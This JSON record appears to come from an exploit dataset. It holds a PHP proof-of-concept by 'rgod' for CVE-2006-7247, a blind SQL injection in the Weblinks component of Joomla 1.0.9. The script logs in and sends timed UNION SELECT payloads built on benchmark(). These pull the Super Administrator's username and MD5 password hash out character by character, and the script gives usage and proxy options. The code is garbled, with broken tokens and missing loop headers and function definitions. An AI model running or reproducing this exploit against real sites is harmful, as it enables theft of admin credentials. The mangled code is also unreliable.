{
    "text": "vul_name : Joomla <= 1.0.9 Weblinks blind SQL injection / admin credentials ， vul_cve : CVE-2006-7247 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"Joomla <= 1.0.9 'Weblinks' blind SQL injection / admin credentials\\r\\n\" ;  ， echo \"disclosure exploit ( benchmark (  ) vesion ) \\r\\n\" ;  ， echo \"by rgod rgod @ autistici.org\\r\\n\" ;  ， echo \"site :  ， echo \"Usage : php \". $ argv [ 0 ] .\" host path user pass OPTIONS\\r\\n\" ;  ， echo \"host : target server ( ip/hostname ) \\r\\n\" ;  ， echo \"path : path to Joomla\\r\\n\" ;  ， echo \"user/pass : you need an account\\r\\n\" ;  ， echo \"Options : \\r\\n\" ;  ， echo \" -T [ prefix ] specify a table prefix different from 'jos_'\\r\\n\" ;  ， echo \" -p [ port ]  : specify a port other than 80\\r\\n\" ;  ， echo \" -P [ ip : port ]  : specify a proxy\\r\\n\" ;  ， echo \"Example : \\r\\n\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /joomla/ username password\\r\\n\" ;  ， die ;  ， } ， explaination :  ， same of ， with some modifications to work against Joomla ， and with an always true statement , to avoid to flood admin of e-mail notifications ， about submissions ( they simply do not succeed but injection works aswell )  ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"\\r\\n\" ;  $ exa.=\"\\r\\n\" ; } ， } ， } ，  $ proxy_regex = ' ( \\b\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\.\\d{1 , 3}\\ : \\d{1 , 5}\\b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.\\r\\n\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"\\r\\n\". $ html ;  ， } ， { ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ user= $ argv [ 3 ]  ;  ，  $ pass= $ argv [ 4 ]  ;  ，  $ port=80 ;  ，  $ prefix=\"jos_\" ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ data =\"username=\". $ user ;  ，  $ data.=\"&passwd=\". $ pass ;  ，  $ data.=\"&remember=yes\" ;  ，  $ data.=\"&option=login\" ;  ，  $ data.=\"&Submit=Login\" ;  ，  $ data.=\"&op2=login\" ;  ，  $ data.=\"&lang=english\" ;  ，  $ data.=\"&return=\".urlencode ( \" ，  $ data.=\"&message=0\" ;  ，  $ packet =\"POST \". $ p.\" HTTP/1.0\\r\\n\" ;  ，  $ packet.=\"Host : \". $ host.\"\\r\\n\" ;  ，  $ packet.=\"Accept : text/plain\\r\\n\" ;  ，  $ packet.=\"Connection : Close\\r\\n\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencoded\\r\\n\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"\\r\\n\\r\\n\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ， ECHO $ html ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ cookie=\" ;  ， { ，  $ temp2=explode ( \" \" ,  $ temp [  $ i ]  )  ;  ，  $ cookie.=\" \". $ temp2 [ 0 ]  ;  ， } ， { ， echo \"Done.\\r\\ncookie -> \". $ cookie.\"\\r\\n\" ;  ， } ，  $ j=1 ;  $ admin=\" ;  ， { ， { ，  $ starttime=time (  )  ;  ，  $ sql=\"' or 'suntzu'='suntzu' UNION SELECT IF ( ASCII ( SUBSTRING ( username , \". $ j.\" , 1 ) =\". $ i.\" ) & 1 , benchmark ( 300000000 , CHAR ( 0 )  , 0 ) FROM \". $ prefix.\"users WHERE usertype='Super Administrator'/ * \" ;  ， echo \"\\r\\n\". $ sql.\"\\r\\n\" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ data =\"title=\". $ sql ;  ，  $ data.=\"&catid=2\" ;  ，  $ data.=\"&url=\".urlencode ( \" ，  $ data.=\"&description=suntzuuuuuuu\" ;  ，  $ data.=\"&id=\" ;  ，  $ data.=\"&option=com_weblinks\" ;  ，  $ data.=\"&task=save\" ;  ，  $ data.=\"&ordering=0\" ;  ，  $ data.=\"&approved=1\" ;  ，  $ data.=\"&Returnid=0\" ;  ，  $ data.=\"&referer=\".urlencode ( \" ，  $ packet =\"POST \". $ p.\"index.php HTTP/1.0\\r\\n\" ;  ，  $ packet.=\"Host : \". $ host.\"\\r\\n\" ;  ，  $ packet.=\"Accept : text/plain\\r\\n\" ;  ，  $ packet.=\"Connection : Close\\r\\n\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencoded\\r\\n\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"\\r\\n\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"\\r\\n\\r\\n\" ;  ，  $ packet.= $ data ;  ， /debug ， /echo quick_dump (  $ packet ) .\"\\r\\n\" ;  ， sendpacketii (  $ packet )  ;  ，  $ endtime=time (  )  ;  ， echo \"endtime -> \". $ endtime.\"\\r\\n\" ;  ，  $ difftime= $ endtime - $ starttime ;  ， echo \"difftime -> \". $ difftime.\"\\r\\n\" ;  ， } ，  $ j+ ;  ， } ，  $ md5s [ 0 ] =0 ; /null ，  $ md5s=array_merge (  $ md5s , range ( 48 , 57 )  ; /numbers ，  $ md5s=array_merge (  $ md5s , range ( 97 , 102 )  ; /a-f letters ， /print_r ( array_values (  $ md5s )  ;  ，  $ j=1 ;  $ password=\" ;  ， { ， { ， { ，  $ starttime=time (  )  ;  ，  $ sql=\"' or 'suntzu'='suntzu' UNION SELECT IF ( ASCII ( SUBSTRING ( password , \". $ j.\" , 1 ) =\". $ i.\" ) & 1 , benchmark ( 300000000 , CHAR ( 0 )  , 0 ) FROM \". $ prefix.\"users WHERE usertype='Super Administrator'/ * \" ;  ， echo \"\\r\\n\". $ sql.\"\\r\\n\" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ data =\"title=\". $ sql ;  ，  $ data.=\"&catid=2\" ;  ，  $ data.=\"&url=\".urlencode ( \" ，  $ data.=\"&description=suntzuuuuuuu\" ;  ，  $ data.=\"&id=\" ;  ，  $ data.=\"&option=com_weblinks\" ;  ，  $ data.=\"&task=save\" ;  ，  $ data.=\"&ordering=0\" ;  ，  $ data.=\"&approved=1\" ;  ，  $ data.=\"&Returnid=0\" ;  ，  $ data.=\"&referer=\".urlencode ( \" ，  $ packet =\"POST \". $ p.\"index.php HTTP/1.0\\r\\n\" ;  ，  $ packet.=\"Host : \". $ host.\"\\r\\n\" ;  ，  $ packet.=\"Accept : text/plain\\r\\n\" ;  ，  $ packet.=\"Connection : Close\\r\\n\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencoded\\r\\n\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"\\r\\n\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"\\r\\n\\r\\n\" ;  ，  $ packet.= $ data ;  ， /debug ， /echo quick_dump (  $ packet ) .\"\\r\\n\" ;  ， sendpacketii (  $ packet )  ;  ，  $ endtime=time (  )  ;  ， echo \"endtime -> \". $ endtime.\"\\r\\n\" ;  ，  $ difftime= $ endtime - $ starttime ;  ， echo \"difftime -> \". $ difftime.\"\\r\\n\" ;  ， } ， } ，  $ j+ ;  ， } ， /if you are here. ， echo \"Exploit succeeded.\\r\\n\" ;  ， echo \"-\\r\\n\" ;  ， echo \"admin -> \". $ admin.\"\\r\\n\" ;  ， echo \"password ( md5 ) -> \". $ password.\"\\r\\n\" ;  ， echo \"-\\r\\n\" ;  ， ?>",
    "time": "2012.09.17"
}